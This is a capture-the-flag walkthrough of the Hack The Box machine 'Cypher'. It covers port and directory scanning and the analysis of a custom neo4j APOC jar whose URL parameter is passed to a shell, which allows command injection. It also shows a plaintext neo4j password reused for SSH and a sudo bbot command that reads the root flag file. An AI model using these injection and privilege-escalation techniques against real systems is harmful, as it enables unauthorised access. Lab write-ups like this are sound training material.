# Cypher - Linux
https://app.hackthebox.com/machines/Cypher <br>

Firstly run an Nmap scan.
```
└─$ nmap -sV -sC -Pn -p- 10.10.11.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 15:30 BST
Nmap scan report for 10.10.11.57
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.37 seconds
```
Then add line to /etc/hosts to add cypher.htb with the machine IP.
This leads to a simple website where you can login.

Within the source code of http://cypher.htb/login, there is a POST script with a comment "TODO: don't store user accounts in neo4j". This suggests that this system is using neo4j so we can use some vulnerabilities to gain access.
![image](https://github.com/user-attachments/assets/32d3a15d-15a1-4325-93fd-89a8a11d173d)

I had also ran gobuster to find any directories 
```
└─$ gobuster dir -u http://cypher.htb -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 4986]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/demo                 (Status: 307) [Size: 0] [--> /login]
/index                (Status: 200) [Size: 4562]
/index.html           (Status: 200) [Size: 4562]
/login                (Status: 200) [Size: 3671]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]                                                                          
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
Found "/testing" which contained "custom-apoc-extension-1.0-SNAPSHOT.jar"
In this is 
```
.
├── META-INF
│   ├── MANIFEST.MF
│   └── maven
│       └── com.cypher.neo4j
│           └── custom-apoc-extension
│               ├── pom.properties
│               └── pom.xml
└── com
    └── cypher
        └── neo4j
            └── apoc
                ├── CustomFunctions$StringOutput.class
                ├── CustomFunctions.class
                ├── HelloWorldProcedure$HelloWorldOutput.class
                └── HelloWorldProcedure.class

9 directories, 7 files
```
So these functions, CustomFunction and HelloWorldProcedure exist in neo4j which I think we can use. 
Lets decompile it.
The HellowWorldProcedure does not have anything useful so I then look at CustomFunctions.

![image](https://github.com/user-attachments/assets/1852e154-39e7-411e-b66d-b8bd7b1d5b0f)
This function returns the HTTP status code for the given URL.
Here we can see that it builds a string that gets executed  ```"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url ```. Therefore we can break out of this using the url parameter.

Next, I made an Cypher injection yet it was not returning anything useful.
![image](https://github.com/user-attachments/assets/27ffd56d-8b6f-4b61-befe-57d9a33ee1ef)
Tried with username as the command injection and it worked. The response was about 5 seconds so I know that the command injection is actually happening.
![image](https://github.com/user-attachments/assets/19d1d79b-03ce-4b95-9d94-b3a3a11bd59c)

Now I will use a reverse shell input whilst listening on my local machine. After tweaking the injection a few times I have got the remote shell.
![image](https://github.com/user-attachments/assets/09738ceb-3256-4289-8ed9-7e7783517705)

Found the neo4j login, but cannot view user.txt under neo4j.
```
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```
Turns out that this password is also used for graphasm ssh login so got user.txt.

Running sudo -l shows what graphasm can execute.
![image](https://github.com/user-attachments/assets/4856678d-8fda-4556-982e-1a477f368821)
This looks interesting and probably used for privilege escalation.
I found a command that allowed me to read this root.txt
```
graphasm@cypher:~$ sudo bbot --debug --custom-yara-rules /root/root.txt
```
![image](https://github.com/user-attachments/assets/cae919a1-cca0-4515-bca6-4fd56fe8a7b5)

